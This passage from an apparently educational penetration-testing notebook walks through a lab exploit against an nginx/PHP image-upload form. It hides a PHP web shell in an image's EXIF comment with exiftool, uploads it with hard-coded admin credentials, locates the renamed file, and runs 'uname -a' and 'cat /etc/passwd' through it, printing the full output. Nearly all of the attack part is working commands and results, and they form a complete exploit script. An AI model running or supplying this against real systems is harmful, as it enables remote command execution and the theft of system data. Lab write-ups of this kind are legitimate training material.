+<p>Consult the challenges documentation for issues about uploading files to an nginx/PHP server. Basically, we embed the php page “&lt;?php system($_GET[‘cmd’]); ?&gt;” in a copy of the existing image file hacker.png using <code class="docutils literal"><span class="pre">exiftool</span></code>. Then we upload it using our admin/P4ssw0rd account, figure out the uploaded file’s name (it’s changed), then use it to execute commands by fetching “<a class="reference external" href="http://$TARGET/admin/uploads">http://$TARGET/admin/uploads</a>/${uploaded}/x.php?cmd=COMMAND”. At this point the exploit is done: we can execute arbitrary shell commands with the permissions of the web server.</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<span class="gp">hacker@kali:~$</span> curl --silent -o hacker.png http://<span class="nv">$TARGET</span>/admin/uploads/hacker.png
+<span class="gp">hacker@kali:~$</span> <span class="nb">echo</span> <span class="s2">&quot;&lt;?php system(\$_GET[&#39;cmd&#39;]); ?&gt;&quot;</span> &gt; shell.php
+<span class="gp">hacker@kali:~$</span> exiftool <span class="s2">&quot;-comment&lt;=shell.php&quot;</span> hacker.png
+<span class="gp">hacker@kali:~$</span> curl --silent --form <span class="nv">action</span><span class="o">=</span>index.php <span class="se">\</span>
+    --form <span class="nv">title</span><span class="o">=</span><span class="s2">&quot;shell&quot;</span> --form <span class="nv">image</span><span class="o">=</span><span class="s2">&quot;@hacker.png&quot;</span> --form <span class="nv">category</span><span class="o">=</span><span class="m">1</span><span class="se">\</span>
+    --form <span class="nv">Add</span><span class="o">=</span><span class="s2">&quot;Add&quot;</span> --form <span class="nv">user</span><span class="o">=</span>admin --form <span class="nv">password</span><span class="o">=</span>P4ssw0rd <span class="se">\</span>
+    -o /dev/null http://<span class="nv">$TARGET</span>/admin/index.php
+<span class="gp">hacker@kali:~$ uploaded=$</span><span class="o">(</span>curl --silent http://<span class="nv">$TARGET</span>/all.php <span class="p">|</span> <span class="se">\</span>
+    grep <span class="s1">&#39;alt=&quot;shell&quot;&#39;</span> <span class="p">|</span> <span class="se">\</span>
+    head -n <span class="m">1</span> <span class="p">|</span> <span class="se">\</span>
+    sed -e <span class="s1">&#39;s/^.*Picture: shell//;s/^.*uploads\/\([0-9]*.png\).*$/\1/&#39;</span><span class="o">)</span>
+<span class="gp">hacker@kali:~$</span> curl --silent <span class="se">\</span>
+    http://<span class="nv">$TARGET</span>/admin/uploads/<span class="si">${</span><span class="nv">uploaded</span><span class="si">}</span>/x.php?cmd<span class="o">=</span>uname%20-a <span class="p">|</span> <span class="se">\</span>
+    strings --bytes<span class="o">=</span><span class="m">15</span>
+<span class="go">Linux debian 2.6.32-5-amd64 #1 SMP Fri May 10 08:43:19 UTC 2013 x86_64 GNU/Linux</span>
+<span class="gp">hacker@kali:~$</span> curl --silent <span class="se">\</span>
+    http://<span class="nv">$TARGET</span>/admin/uploads/<span class="si">${</span><span class="nv">uploaded</span><span class="si">}</span>/x.php?cmd<span class="o">=</span>cat%20/etc/passwd <span class="p">|</span> <span class="se">\</span>
+    strings --bytes<span class="o">=</span><span class="m">15</span>
+<span class="go">root:x:0:0:root:/root:/bin/bash</span>
+<span class="go">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span>
+<span class="go">bin:x:2:2:bin:/bin:/bin/sh</span>
+<span class="go">sys:x:3:3:sys:/dev:/bin/sh</span>
+<span class="go">sync:x:4:65534:sync:/bin:/bin/sync</span>
+<span class="go">games:x:5:60:games:/usr/games:/bin/sh</span>
+<span class="go">man:x:6:12:man:/var/cache/man:/bin/sh</span>
+<span class="go">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span>
+<span class="go">mail:x:8:8:mail:/var/mail:/bin/sh</span>
+<span class="go">news:x:9:9:news:/var/spool/news:/bin/sh</span>
+<span class="go">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span>
+<span class="go">proxy:x:13:13:proxy:/bin:/bin/sh</span>
+<span class="go">www-data:x:33:33:www-data:/var/www:/bin/sh</span>
+<span class="go">backup:x:34:34:backup:/var/backups:/bin/sh</span>
+<span class="go">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span>
+<span class="go">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span>
+<span class="go">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span>
+<span class="go">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span>
+<span class="go">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span>
+<span class="go">mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false</span>
+<span class="go">user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash</span>
+</pre></div>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="from_sql_injection_to_shell.html" class="btn btn-neutral float-right" title="3.24. PentesterLab From SQL injection to Shell" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="owning_database_with_sqlmap.html" class="btn btn-neutral" title="3.22. Owning the Database with SQLMap" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
